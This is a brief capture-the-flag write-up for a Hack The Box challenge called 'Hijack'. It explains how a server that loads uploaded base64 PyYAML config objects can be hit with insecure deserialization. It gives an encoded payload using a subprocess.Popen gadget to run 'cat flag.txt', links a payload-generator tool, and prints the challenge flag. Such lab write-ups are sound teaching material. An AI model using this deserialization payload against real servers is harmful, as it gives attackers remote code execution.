# Hijack

In this challenge we have a server that allows us to create and upload configuration objects which look like this:

`ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICc0JywgYXV0b19jYWxpYnJhdGlvbjogJ29uJywKICBwcm9wdWxzaW9uX3RlbXA6ICcyJywgc29sYXJfYXJyYXlfdGVtcDogJzMnLCB1bml0czogJzEnfQo=`

which is a base64 encoded PyYAML serialized object. The vulnerability here lies in the fact that we can upload whichever object we want and achieve RCE (Remote Command Execution) on the server via insecure deserialization. We can use this really nice [Peas.py tool](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) to automate the creation of our payload , which in my case was a simple `cat flag.txt` command:

`ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gY2F0CiAgLSBmbGFnLnR4dAo=`

## HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
